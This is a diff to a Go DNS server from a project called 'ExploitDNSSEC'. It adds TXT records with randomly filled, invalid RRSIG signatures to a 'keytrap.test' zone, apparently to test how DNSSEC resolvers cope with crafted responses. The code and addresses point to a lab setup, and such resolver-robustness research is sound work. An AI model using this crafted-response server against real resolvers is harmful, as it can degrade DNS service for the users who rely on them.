@@ -1,16 +1,18 @@
 /**
  * @Project :   ExploitDNSSEC
- * @File    :   dns_auth_frag.go
+ * @File    :   InBaliwickTXT.go
  * @Contact :	tochus@163.com
  * @License :   (C)Copyright 2024
+ * @Description: A DNS server that sends in-bailiwick TXT records with their RRSIG records in the additional section.
  *
  * @Modify Time        @Author     @Version    @Description
  * ----------------    --------    --------    -----------
  * 4/8/23 5:34 PM      idealeer    0.0         None
  * 14/10/24 16:28	   4stra       0.1.0       Enable DNSSEC
  * 15/10/24 11:10      4stra       0.2.0       Ethnet Fragmentation
+ * 15/10/24 19:49      4stra       0.3.0       Large TXT RRSET
+ * 16/10/24 10:25 	   4stra       0.4.0       In-bailiwick TXT records within AR
  */
-
 package main
 
 import (
@@ -27,6 +29,81 @@ import (
 	"github.com/tochusc/gopacket/layers"
 	"github.com/tochusc/gopacket/pcap"
 )
+
+var nsRecordNumC = 8
+var randomSigNumC = 1
+var rrsigSignatureByteLenC = 96
+var nsIPv4C = "10.10.3.3"
+var nsIPv6C = "2001:db8::3"
+
+var authrotiySection = func() []layers.DNSResourceRecord {
+	authority := make([]layers.DNSResourceRecord, 0)
+	authority = append(
+		authority,
+		layers.DNSResourceRecord{
+			Name:  []byte("keytrap.test"),
+			Type:  layers.DNSTypeNS,
+			Class: layers.DNSClassIN,
+			TTL:   uint32(globalTTLC),
+			NS:    []byte(fmt.Sprintf("ns1.keytrap.test")),
+		},
+	)
+	authority = append(authority,
+		layers.DNSResourceRecord{
+			Name:       []byte("keytrap.test"),
+			Type:       layers.DNSTypeRRSIG,
+			Class:      layers.DNSClassIN,
+			TTL:        uint32(globalTTLC),
+			DataLength: rrsig["keytrap.test"].Len(),
+			Data:       rrsig["keytrap.test"].Serialize(),
+		},
+	)
+	return authority
+}()
+
+var additonalSection = func() []layers.DNSResourceRecord {
+	additional := make([]layers.DNSResourceRecord, 0)
+	additional = append(
+		additional,
+		layers.DNSResourceRecord{
+			Name:  []byte("keytrap.test"),
+			Type:  layers.DNSTypeTXT,
+			Class: layers.DNSClassIN,
+			TTL:   uint32(globalTTLC),
+			TXTs:  [][]byte{[]byte("This is a TXT record")},
+		},
+		layers.DNSResourceRecord{
+			Name:       []byte("keytrap.test"),
+			Type:       layers.DNSTypeRRSIG,
+			Class:      layers.DNSClassIN,
+			TTL:        uint32(globalTTLC),
+			DataLength: baseTXTRRSIG.Len() + uint16(rrsigSignatureByteLenC),
+			Data:       append(baseTXTRRSIG.Serialize(), genRandomByte(rrsigSignatureByteLenC)...),
+		},
+	)
+	return additional
+}()
+
+var baseTXTRRSIG = &RRSIG{
+	TypeCovered: uint16(layers.DNSTypeTXT),
+	Algorithm:   14,
+	Labels:      3,
+	OriginalTTL: globalTTL,
+	Expiration:  expiration,
+	Inception:   inception,
+	KeyTag:      zskKeyTag,
+	SignerName:  signerName,
+}
+
+func genRandomByte(byteLen int) []byte {
+	b := make([]byte, byteLen)
+	_, err := rand.Read(b)
+	if err != nil {
+		fmt.Println("Error: ", err)
+		os.Exit(1)
+	}
+	return b
+}
 
 // DNS服务器配置相关变量
 var (
@@ -374,8 +451,8 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 				ResponseCode: 0,
 				QDCount:      1,
 				ANCount:      2,
-				NSCount:      2,
-				ARCount:      2,
+				NSCount:      uint16(len(authrotiySection)),
+				ARCount:      uint16(len(additonalSection)),
 				Questions: []layers.DNSQuestion{
 					{
 						Name:  []byte(qname),
@@ -401,42 +478,8 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 						Data:       rrsig[qname].Serialize(),
 					},
 				},
-				Authorities: []layers.DNSResourceRecord{
-					{
-						Name:  []byte("keytrap.test"),
-						Type:  layers.DNSTypeNS,
-						Class: layers.DNSClassIN,
-						TTL:   uint32(globalTTLC),
-						NS:    []byte("ns1.keytrap.test"),
-					},
-					// RRSIG
-					{
-						Name:       []byte("keytrap.test"),
-						Type:       layers.DNSTypeRRSIG,
-						Class:      layers.DNSClassIN,
-						TTL:        uint32(globalTTLC),
-						DataLength: rrsig["keytrap.test"].Len(),
-						Data:       rrsig["keytrap.test"].Serialize(),
-					},
-				},
-				Additionals: []layers.DNSResourceRecord{
-					{
-						Name:  []byte("ns1.keytrap.test"),
-						Type:  layers.DNSTypeA,
-						Class: layers.DNSClassIN,
-						TTL:   uint32(globalTTLC),
-						IP:    net.ParseIP(serverIPC),
-					},
-					// RRSIG
-					{
-						Name:       []byte("ns1.keytrap.test"),
-						Type:       layers.DNSTypeRRSIG,
-						Class:      layers.DNSClassIN,
-						TTL:        uint32(globalTTLC),
-						DataLength: rrsig["ns1.keytrap.test"].Len(),
-						Data:       rrsig["ns1.keytrap.test"].Serialize(),
-					},
-				},
+				Authorities: authrotiySection,
+				Additionals: additonalSection,
 			}
 		}
 	case layers.DNSTypeDNSKEY:
